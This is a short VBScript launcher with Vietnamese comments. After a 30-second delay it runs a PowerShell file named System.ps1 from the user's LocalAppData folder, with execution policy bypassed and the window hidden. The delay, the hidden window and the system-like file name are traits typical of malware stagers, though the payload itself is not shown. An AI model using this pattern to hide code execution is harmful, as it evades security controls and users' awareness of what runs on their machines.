Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Lấy đường dẫn thư mục AppData\Local của user hiện tại
localPath = objShell.ExpandEnvironmentStrings("%LocalAppData%") & "\System.ps1"

' Kiểm tra file có tồn tại không
If objFSO.FileExists(localPath) Then
    WScript.Sleep 30000
    objShell.Run "powershell.exe -ExecutionPolicy Bypass -File """ & localPath & """", 0, False
Else
    ' Hiển thị thông báo lỗi nếu không tìm thấy file
    MsgBox "Không tìm thấy file: " & localPath, 16, "Lỗi"
End If
